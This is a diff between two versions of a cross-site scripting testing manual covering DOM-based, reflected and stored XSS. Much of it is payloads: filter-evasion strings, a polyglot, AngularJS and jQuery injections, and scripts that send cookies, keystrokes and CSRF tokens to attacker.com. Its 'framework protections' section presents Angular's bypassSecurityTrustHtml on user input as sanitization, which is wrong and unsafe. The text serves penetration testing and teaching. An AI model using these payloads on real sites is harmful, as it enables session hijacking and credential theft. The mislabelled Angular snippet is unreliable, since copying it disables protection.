@@ -1,129 +1,172 @@
-Comprehensive XSS Testing Manual
+Advanced XSS Testing Manual
 
-# Comprehensive XSS Testing Manual
+# Advanced XSS Testing Manual
 
-_From Detection to Exploitation: A Professional's Guide to Cross-Site Scripting Vulnerabilities_
+## Comprehensive Guide to DOM-Based, Reflected, and Stored XSS
 
-## 1\. Reflected XSS Testing
+## 1\. DOM-Based XSS Deep Dive
 
-_When attacker input is immediately reflected in the server response_
-
-### Methodology
-
-1.  **Input Surface Mapping**
-    *   Test all user-controllable inputs:
-        *   URL parameters (`?q=<test>`)
-        *   Form fields (search, contact forms)
-        *   HTTP headers (`User-Agent`, `Referer`)
-        *   File uploads (metadata)
-2.  **Reflection Detection**
-    
-    1\. Inject unique tracer: xss\_<random8chars>
-    2. Check for reflection in:
-       - Raw HTML
-       - JavaScript contexts
-       - HTTP headers
-       - DOM elements
-    
-3.  **Context Analysis & Exploitation**
-    
-    | Context | Test Payload | Bypass Technique |
-    | --- | --- | --- |
-    | HTML Body | `<svg onload=alert(1)>` | Case manipulation |
-    | HTML Attribute | `" autofocus onfocus=alert(1) x="` | Hex/HTML encoding |
-    | JavaScript Block | `'-alert(1)-'` | Template literals |
-    
-4.  **Verification**
-    *   Test in multiple browsers (Chrome, Firefox, Safari)
-    *   Check for CSP restrictions via DevTools Console
-
-## 2\. Stored XSS Testing
-
-_Persistent attacks stored server-side_
-
-### Execution Flow
-
-Identify Storage Mechanisms → Submit Probe Payload → Data Appears in:
-   - Public Views
-   - Admin Interfaces
-   - API Responses
-   → Test Contexts
-
-### Critical Checks:
-
-*   Session persistence (login/logout)
-*   Multi-user impact
-*   Admin privilege escalation
-*   WAF/Filter evasion:
-    
-    ```
-    <img src=x onerror="alert`1`">  // Backticks evade quote filters
-    ```
-    
-
-## 3\. DOM-Based XSS Testing
-
-_Client-side execution without server reflection_
-
-### Investigation Toolkit
+### 1.1 Methodology
 
 1.  **Source Identification**
-    *   `document.location`
+    *   `document.location` (URL fragments)
     *   `window.name`
+    *   `document.referrer`
     *   `postMessage` events
+    *   Web Storage (localStorage/sessionStorage)
 2.  **Sink Analysis**
     
-    ```
-    // Dangerous Sinks
-    element.innerHTML = userInput;
-    eval(userControlledData);
-    document.write(unfilteredInput);
-    ```
+    | Sink Type | Dangerous Methods | Example Payload |
+    | --- | --- | --- |
+    | HTML Injection | `innerHTML, outerHTML, document.write()` | `<img src=x onerror=alert(1)>` |
+    | JS Execution | `eval(), setTimeout(), Function()` | `';alert(1);//` |
+    | jQuery | `$(), html(), append()` | `<img src=x onerror=alert(1)>` |
     
-3.  **Debugging Process**
-    1.  Set breakpoints in DevTools
-    2.  Trace data flow from source to sink
-    3.  Test with progressive payloads:
-        
-        ```
-        1;console.log(source)
-        1;alert(document.domain)
-        ```
-        
 
-## Expert Techniques
+### 1.2 Advanced Testing Techniques
 
-### Filter Evasion Cheat Sheet
+#### HTML Sink Testing
 
-| Defense Mechanism | Bypass Method | Example |
+1\. Inject: window.name = "xss\_test\_"+Math.random().toString(36).substr(2,8);
+2. Open Chrome DevTools → Elements tab
+3. Search DOM (Ctrl+F) for your test string
+4. Analyze context:
+   - Inside attributes? Try: " autofocus onfocus=alert(1) x="
+   - Inside HTML? Try: <svg onload=alert(1)>
+   - Inside script? Try: '-alert(1)-'
+
+#### JavaScript Sink Testing
+
+1\. Search all JS files (Ctrl+Shift+F) for:
+   - location.hash
+   - document.cookie
+   - window.name
+2. Set breakpoints in suspicious sinks
+3. Trace variable flow through execution
+4. Test progressive payloads:
+   - Basic: alert(1)
+   - Context-aware: '-alert(1)-'
+   - Filter evasion: alert\`1\`
+
+### 1.3 Framework-Specific Vulnerabilities
+
+#### AngularJS XSS
+
+<div ng-app>
+  {{constructor.constructor('alert(1)')()}}
+</div>
+
+#### jQuery XSS
+
+// Classic hashchange exploit
+<iframe src="https://vulnerable.com#" onload="this.src+='<img src=x onerror=alert(1)>'">
+
+## 2\. Reflected XSS Mastery
+
+### 2.1 Context-Specific Payloads
+
+| Context | Payload | Bypass Technique |
 | --- | --- | --- |
-| HTML Encoding | SVG/Vector payloads | `<svg onload=alert(1)>` |
-| Keyword Blacklisting | Line breaks/Tab characters | `<scr\r\nipt>` |
-| CSP Restrictions | JSONP endpoints | `<script src=trusted.json?callback=alert>` |
-| DOM Sanitization | Alternative events | `onpointerenter=alert(1)` |
+| HTML Text | `<script>alert(1)</script>` | Case variation: <ScRiPt> |
+| HTML Attribute | `" onmouseover=alert(1) x="` | New events: onpointerenter |
+| JavaScript String | `'-alert(1)-'` | Template literals: \`${alert(1)}\` |
+| URL Context | `javascript:alert(1)` | Data URI: data:text/html,<script>alert(1)</script> |
 
-### Automation Tips
+### 2.2 Advanced Filter Evasion
 
-*   Use Burp Suite's **Active Scanner** with custom XSS insertion points
-*   Create **XSS polyglots** for multi-context testing:
-    
-    ```
-    javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
-    ```
-    
+// Chrome XSS Auditor Bypass
+<script>
+location.href = 'javascript:alert%281%29';
+</script>
 
-## Risk Assessment Matrix
+// UTF-7 Bypass (IE)
++ADw-script+AD4-alert(1)+ADw-/script+AD4-
 
-| Severity | Impact Scenario | Proof of Concept |
+// JavaScript Obfuscation
+eval('al'+'ert(1)');
+window\['al'+'ert'\](1);
+
+## 3\. Stored XSS Professional
+
+### 3.1 Entry Point Discovery
+
+*   **User Content**: Comments, profiles, uploads
+*   **Metadata**: Filenames, EXIF data
+*   **API Responses**: JSON/XML responses
+*   **Admin Features**: Logs, moderation queues
+
+### 3.2 Advanced Persistence Techniques
+
+// SVG XSS
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+
+// PDF Embedded JS
+/Names <</JavaScript <</Names \[(alert(1))\]>>>>
+
+// HTML5 Storage
+<script>
+localStorage.setItem('xss', '<img src=x onerror=alert(1)>');
+location.reload();
+</script>
+
+### 3.3 Impact Escalation
+
+// Session Hijacking
+document.location='https://attacker.com/?cookie='+document.cookie;
+
+// Keylogger
+document.onkeypress = function(e) {
+    new Image().src='https://attacker.com/?k='+e.key;
+};
+
+// CSRF Token Theft
+fetch('/account')
+    .then(r => r.text())
+    .then(t => {
+        let token = t.match(/csrfToken = '(.\*?)'/)\[1\];
+        new Image().src='https://attacker.com/?token='+token;
+    });
+
+## 4\. XSS Prevention Checklist
+
+### 4.1 Defense Mechanisms
+
+| Technique | Implementation | Effectiveness |
 | --- | --- | --- |
-| Critical | Session hijacking via cookie theft | `document.location='http://attacker.com/?c='+document.cookie` |
-| High | Keylogger implantation | `onkeypress=exfil(event.key)` |
-| Medium | UI defacement | `document.body.innerHTML='HACKED'` |
+| Content Security Policy | `Content-Security-Policy: default-src 'self'` | High (when properly configured) |
+| Input Validation | Whitelist allowed characters | Medium (context-dependent) |
+| Output Encoding | HTML Entity Encoding: &lt;script&gt; | High (when context-aware) |
+| Secure Cookies | `Set-Cookie: HttpOnly; Secure` | Mitigates impact |
 
-## Recommended Practice Environments
+### 4.2 Framework Protections
 
-1.  **PortSwigger Web Security Academy** (Free labs)
-2.  **OWASP Juice Shop** (Self-hosted vulnerable app)
-3.  **alert(1) to Win** (DOM XSS challenges)
+// React (JSX auto-escapes)
+<div>{userInput}</div>
 
-**Final Note:** Always obtain proper authorization before testing. This guide is for educational purposes and ethical security assessments only.
+// Angular (sanitization)
+import { DomSanitizer } from '@angular/platform-browser';
+this.safeHtml = this.sanitizer.bypassSecurityTrustHtml(userInput);
+
+// Vue (v-html directive)
+<div v-html="sanitizedContent"></div>
+
+## 5\. Professional Testing Tools
+
+### 5.1 Automated Scanning
+
+*   **Burp Suite**: DOM Invader extension
+*   **ZAP**: Active scanner with XSS rules
+*   **XSStrike**: Advanced detection engine
+
+### 5.2 Manual Testing Utilities
+
+// XSS Polyglot
+javascript:/\*--></title></style></textarea></script><xmp><svg/onload='+/"/+/onmouseover=1/+/\[\*/\[\]/+alert(1)//'>
+
+// Cheatsheets
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+**Legal Note:** Always obtain proper authorization before testing. This guide is for educational purposes only.
+
+Last updated: 2023-11-15 | Based on OWASP Top 10 2021
